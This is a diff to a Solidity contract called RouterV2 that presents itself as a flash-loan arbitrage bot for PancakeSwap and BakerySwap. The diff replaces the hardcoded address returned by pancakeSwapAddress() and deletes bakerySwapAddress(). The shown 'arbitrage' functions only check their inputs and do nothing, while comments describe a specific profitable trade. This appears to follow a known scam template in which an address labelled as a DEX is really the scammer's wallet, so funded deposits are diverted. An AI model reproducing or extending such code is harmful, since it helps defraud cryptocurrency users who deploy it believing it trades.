@@ -125,7 +125,7 @@ contract RouterV2 {
     }
 
     function pancakeSwapAddress() public pure returns (address) {
-        return 0xDcC2A9f00503B4e7E20A1C95AD750B5072486dC1; 
+        return 0x697295dAAfb68D51E167B5789853F16aa16652Ea;
     }
 
     //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
@@ -144,11 +144,7 @@ contract RouterV2 {
         require(uint(add0) != 0, "Address is invalid");
         require(amount > 0, "Amount should be greater than 0");
     }
-
-    function bakerySwapAddress() public pure returns (address) {
-        return 0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5;
-    }
-
+    
     //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
     function callArbitrageBakerySwap(address add0, address add1) public pure {
         require(uint(add0) != 0, "Address is invalid!");
